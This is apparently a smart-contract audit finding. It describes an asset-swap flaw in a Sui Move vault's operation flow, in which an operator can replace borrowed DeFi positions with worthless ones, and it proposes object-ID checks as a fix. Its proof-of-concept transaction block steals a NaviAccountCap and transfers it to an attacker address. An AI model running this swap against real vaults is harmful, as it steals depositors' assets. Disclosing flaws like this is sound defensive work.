### Title
Asset Swap Vulnerability in Operation Flow - NaviAccountCap and Other DeFi Assets Can Be Stolen Through Bag Manipulation

### Summary
The `end_op_value_update_with_bag` function only verifies that asset keys exist in the vault after operations complete, but does not verify that the returned assets are the same object instances that were borrowed. An operator can exploit this by manipulating the intermediate `Bag` object using Sui's public bag API to swap valuable DeFi assets (NaviAccountCap, CetusPosition, SuilendObligationOwnerCap, MomentumPosition) with worthless replacements, resulting in direct theft of vault assets.

### Finding Description

**Root Cause:**

The verification check in `end_op_value_update_with_bag` uses `contains_asset_type`, which only checks for key existence, not object identity: [1](#0-0) 

This check calls the vault's `contains_asset_type` function, which simply checks if a key exists in the vault's assets Bag: [2](#0-1) 

**Operation Flow:**

1. In `start_op_with_bag`, assets are borrowed from the vault and placed into a transaction-owned Bag: [3](#0-2) 

2. The Bag is returned by value to the operator's transaction: [4](#0-3) 

3. In `end_op_with_bag`, whatever asset exists at the expected key is removed from the Bag and returned to the vault: [5](#0-4) 

4. The `return_defi_asset` function accepts any asset of the correct type and adds it to the vault's Bag with the given key: [6](#0-5) 

**Why Protections Fail:**

- No object ID tracking exists in the operation flow
- The `OperationValueUpdateRecord` only tracks asset type keys (strings), not object instances: [7](#0-6) 

- The verification in `check_op_value_update_record` only confirms that asset values were updated, not that objects are identical: [8](#0-7) 

### Impact Explanation

**Direct Vault Asset Theft:**

An operator can steal valuable DeFi positions from the vault:
- **NaviAccountCap** with significant collateral and lending positions
- **CetusPosition** with concentrated liquidity 
- **SuilendObligationOwnerCap** with borrowing capacity
- **MomentumPosition** with yield-bearing deposits
- **Receipt** objects representing vault claims

The vault loses custody of valuable DeFi assets while receiving worthless replacements. The same validation gap exists for all five asset types checked in the operation: [9](#0-8) 

**Affected Parties:**
- All vault depositors whose shares represent claim on stolen assets
- Protocol loses TVL and reputation
- Stolen positions may have unbounded value depending on collateral/liquidity

**Severity:** Critical - Direct theft of vault custody with no recovery mechanism.

### Likelihood Explanation

**Attacker Capabilities:**

The attacker needs:
1. An OperatorCap (trusted role, but single compromised/malicious operator sufficient)
2. A worthless replacement asset of the same type (e.g., empty NaviAccountCap)
3. Ability to construct a Programmable Transaction Block (PTB)

**Execution Practicality:**

The attack is straightforward using Sui's public bag API:

```
1. Call start_op_with_bag -> receive Bag containing valuable NaviAccountCap
2. Call sui::bag::remove<String, NaviAccountCap>(bag, "NaviAccountCap0") -> extract valuable asset
3. Call sui::bag::add<String, NaviAccountCap>(bag, "NaviAccountCap0", worthless_cap) -> insert replacement
4. Call end_op_with_bag with modified bag -> worthless asset returned to vault
5. Call end_op_value_update_with_bag -> check passes (key exists)
6. Transfer stolen valuable asset to attacker's address
```

The Bag is owned by the transaction between function calls, allowing manipulation. The bag must be empty after `end_op_with_bag`: [10](#0-9) 

This is satisfied because the attacker maintains the same number of assets (one removed, one added with same key).

**Detection Constraints:**

- Attack executes atomically in a single PTB
- Value update checks only verify key existence
- No on-chain mechanism tracks object identity
- Post-attack state appears valid (key exists, bag empty)

**Probability:** High - Simple PTB construction with deterministic outcome once operator access obtained.

### Recommendation

**Immediate Fix:**

Track object IDs during operations to verify returned assets are identical to borrowed assets:

1. Modify `TxBagForCheckValueUpdate` to include object IDs:
```move
public struct TxBagForCheckValueUpdate {
    vault_id: address,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    defi_asset_object_ids: vector<ID>, // ADD THIS
    total_usd_value: u256,
    total_shares: u256,
}
```

2. In `start_op_with_bag`, record object IDs when borrowing assets:
```move
let navi_account_cap = vault.borrow_defi_asset<T, NaviAccountCap>(...);
defi_asset_object_ids.push_back(object::id(&navi_account_cap)); // ADD THIS
defi_assets.add<String, NaviAccountCap>(navi_asset_type, navi_account_cap);
```

3. In `end_op_value_update_with_bag`, verify object IDs match:
```move
if (defi_asset_type == type_name::get<NaviAccountCap>()) {
    let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
    assert!(vault.contains_asset_type(navi_asset_type), ERR_ASSETS_NOT_RETURNED);
    let returned_asset = vault.get_defi_asset<T, NaviAccountCap>(navi_asset_type);
    assert!(object::id(returned_asset) == expected_object_id, ERR_ASSET_SWAPPED); // ADD THIS
}
```

**Additional Hardening:**

- Add `ERR_ASSET_SWAPPED` error constant
- Implement similar checks for all five asset types (CetusPosition, SuilendObligationOwnerCap, MomentumPosition, Receipt)
- Add integration tests that attempt asset swapping and verify rejection

### Proof of Concept

**Initial State:**
- Vault contains valuable NaviAccountCap at key "NaviAccountCap0" with 1M SUI collateral
- Attacker has OperatorCap and empty NaviAccountCap (0 SUI collateral)

**Attack Transaction (PTB):**

```move
// Transaction block constructed by malicious operator
{
    // Step 1: Start operation, borrow valuable NaviAccountCap
    let (bag, tx, tx_check, principal, coin_asset) = start_op_with_bag(
        vault, operation, operator_cap, clock,
        vector[0], // defi_asset_ids 
        vector[type_name::get<NaviAccountCap>()],
        0, 0, ctx
    );
    
    // Step 2: Extract valuable NaviAccountCap from bag
    let valuable_cap = sui::bag::remove<String, NaviAccountCap>(
        &mut bag, 
        string::utf8(b"NaviAccountCap0")
    );
    
    // Step 3: Insert worthless NaviAccountCap into bag
    sui::bag::add<String, NaviAccountCap>(
        &mut bag,
        string::utf8(b"NaviAccountCap0"),
        attacker_worthless_cap // Pre-owned by attacker
    );
    
    // Step 4: End operation - worthless cap returned to vault
    end_op_with_bag(vault, operation, operator_cap, bag, tx, principal, coin_asset);
    
    // Step 5: Value update check passes (key exists)
    end_op_value_update_with_bag(vault, operation, operator_cap, clock, tx_check);
    
    // Step 6: Transfer stolen valuable cap
    transfer::public_transfer(valuable_cap, attacker_address);
}
```

**Expected Result:** Transaction aborts with asset identity mismatch error

**Actual Result:** Transaction succeeds, attacker receives valuable NaviAccountCap, vault receives worthless replacement

**Success Condition:** Attacker's address owns NaviAccountCap with 1M SUI collateral, vault's "NaviAccountCap0" has 0 SUI collateral

### Citations

**File:** volo-vault/sources/operation.move (L94-104)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
```

**File:** volo-vault/sources/operation.move (L118-124)
```text
        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = vault.borrow_defi_asset<T, NaviAccountCap>(
                vault_utils::parse_key<NaviAccountCap>(defi_asset_id),
            );
            defi_assets.add<String, NaviAccountCap>(navi_asset_type, navi_account_cap);
        };
```

**File:** volo-vault/sources/operation.move (L235-239)
```text
        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = defi_assets.remove<String, NaviAccountCap>(navi_asset_type);
            vault.return_defi_asset(navi_asset_type, navi_account_cap);
        };
```

**File:** volo-vault/sources/operation.move (L294-296)
```text
    vault.enable_op_value_update();

    defi_assets.destroy_empty();
```

**File:** volo-vault/sources/operation.move (L320-351)
```text
    let length = defi_asset_ids.length();
    let mut i = 0;
    while (i < length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            assert!(vault.contains_asset_type(navi_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(cetus_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let suilend_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            assert!(vault.contains_asset_type(suilend_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(momentum_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        i = i + 1;
    };
```

**File:** volo-vault/sources/volo_vault.move (L142-146)
```text
public struct OperationValueUpdateRecord has store {
    asset_types_borrowed: vector<String>,
    value_update_enabled: bool,
    asset_types_updated: Table<String, bool>,
}
```

**File:** volo-vault/sources/volo_vault.move (L1206-1219)
```text
public(package) fun check_op_value_update_record<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
) {
    self.check_version();
    self.assert_enabled();
    assert!(self.op_value_update_record.value_update_enabled, ERR_OP_VALUE_UPDATE_NOT_ENABLED);

    let record = &self.op_value_update_record;

    record.asset_types_borrowed.do_ref!(|asset_type| {
        assert!(record.asset_types_updated.contains(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
        assert!(*record.asset_types_updated.borrow(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L1346-1351)
```text
public(package) fun contains_asset_type<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): bool {
    self.assets.contains(asset_type)
}
```

**File:** volo-vault/sources/volo_vault.move (L1436-1449)
```text
public(package) fun return_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    asset: AssetType,
) {
    self.check_version();

    emit(DefiAssetReturned {
        vault_id: self.vault_id(),
        asset_type: asset_type,
    });

    self.assets.add<String, AssetType>(asset_type, asset);
}
```
